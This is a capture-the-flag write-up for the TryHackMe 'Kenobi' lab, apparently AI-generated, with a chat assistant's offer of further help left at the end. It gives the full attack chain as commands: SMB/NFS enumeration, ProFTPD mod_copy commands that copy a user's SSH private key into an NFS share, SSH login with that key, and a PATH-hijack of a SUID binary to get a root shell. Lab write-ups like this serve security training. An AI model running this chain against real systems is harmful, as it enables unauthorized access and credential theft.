# 🐧 TryHackMe: Kenobi Write-up

## 📌 Challenge Overview

* **Platform:** TryHackMe
* **Room:** Kenobi
* **Category:** Linux Enumeration, SMB/NFS, ProFTPD Exploitation, Privilege Escalation
* **Objective:**

  * Enumerate SMB & NFS services
  * Exploit **ProFTPD mod_copy vulnerability**
  * Retrieve SSH private key
  * Escalate privileges using **PATH variable manipulation**

---

## 🔍 1. Reconnaissance

### 🛰️ Port Scanning

Run a full **Nmap scan**:

```bash id="2qg6kp"
nmap -sC -sV -p- -oN nmap/initial <TARGET_IP>
```

### 📊 Results

| Port | Service | Version             |
| ---- | ------- | ------------------- |
| 21   | FTP     | ProFTPD 1.3.5       |
| 22   | SSH     | OpenSSH 7.2p2       |
| 80   | HTTP    | Apache              |
| 111  | RPC     | rpcbind             |
| 139  | SMB     | Samba               |
| 445  | SMB     | Samba               |
| 2049 | NFS     | Network File System |

---

## 📡 SMB Enumeration

Enumerate SMB shares:

```bash id="2y2mco"
nmap -p 445 --script smb-enum-shares,smb-enum-users <TARGET_IP>
```

### 🔓 Anonymous Access

Connect using:

```bash id="4s5v6r"
smbclient //<TARGET_IP>/anonymous
```

📂 Found file:

```id="t9p2fd"
log.txt
```

Download it:

```bash id="y7n3dp"
get log.txt
```

---

### 📄 log.txt Insights

* SSH key generated for user: **kenobi**
* ProFTPD configuration details revealed

---

## 📁 NFS Enumeration

Check NFS shares:

```bash id="p8y2zt"
nmap -p 111 --script nfs-ls,nfs-stat,nfs-showmount <TARGET_IP>
```

✅ Found:

```id="c6g1mr"
/var (mountable)
```

---

## 💥 2. Exploitation (Initial Access)

### ⚙️ ProFTPD mod_copy Exploit

Target:

```id="8kz3xr"
ProFTPD 1.3.5
```

This version is vulnerable to **mod_copy**, allowing file copying without authentication.

---

### 🔗 Exploit via Netcat

```bash id="w2k1n7"
nc <TARGET_IP> 21
```

Execute:

```text id="9v1yhg"
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

✅ Result:

```id="u7h3df"
250 Copy successful
```

---

## 📥 Retrieve SSH Key via NFS

### 📂 Mount NFS

```bash id="n3z8qp"
mkdir /mnt/kenobiNFS
sudo mount <TARGET_IP>:/var /mnt/kenobiNFS
```

### 📥 Copy Key

```bash id="z9k3vr"
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
```

---

## 🔑 Gaining Access

```bash id="x1t7me"
ssh -i id_rsa kenobi@<TARGET_IP>
```

🎉 Shell obtained!

---

### 🏁 User Flag

```bash id="d4n2kp"
cd /home/kenobi
cat user.txt
```

---

## 🔐 3. Privilege Escalation

### 🔍 Find SUID Binaries

```bash id="m2t8sz"
find / -type f -perm -4000 2>/dev/null
```

🚨 Interesting binary:

```id="y8c2rm"
/usr/bin/menu
```

---

## ⚙️ Binary Analysis

Run:

```bash id="v6g2xl"
/usr/bin/menu
```

Options:

* Status check
* Kernel version
* Ifconfig

---

### 🔎 Inspect Binary

```bash id="a9d3qs"
strings /usr/bin/menu
```

📌 Observed:

* Uses `curl`, `uname`, `ifconfig`
* ❌ No absolute paths used

---

## 💣 PATH Variable Exploitation

### 📂 Move to Writable Directory

```bash id="b4f7yt"
cd /tmp
```

---

### 🧨 Create Malicious Binary

```bash id="j7s2qp"
echo /bin/sh > curl
chmod 777 curl
```

---

### 🔄 Modify PATH

```bash id="k2z9lx"
export PATH=/tmp:$PATH
```

---

### 🚀 Execute Exploit

```bash id="p5x3rv"
/usr/bin/menu
```

👉 Select:

```id="t3w9mx"
Option 1 (Status check)
```

---

### 🎉 Root Shell

```id="r9p2sd"
root access gained!
```

---

## 🏁 Root Flag

```bash id="z6c4yo"
cd /root
cat root.txt
```

---

## 🧠 Key Takeaways

* SMB anonymous shares can leak sensitive information
* NFS misconfigurations expose critical directories
* ProFTPD mod_copy allows file access without authentication
* Always check SUID binaries for misconfigurations
* PATH variable manipulation is a powerful privilege escalation technique

---

## 🛠️ Tools Used

* Nmap
* SMBClient
* Netcat
* NFS
* SSH
* Strings

---

## 📚 References

* [https://tryhackme.com](https://tryhackme.com)
* [https://gtfobins.github.io](https://gtfobins.github.io)
* [https://www.exploit-db.com](https://www.exploit-db.com)

---

## ✍️ Author

**Muhammad Taher**
Cyber Security Enthusiast | CTF Player

---

If you want next level upgrade 🔥
I can:

* Combine **all your THM write-ups into one pro repo**
* Add **diagrams (attack flow)**
* Create a **portfolio-ready README with screenshots & badges**
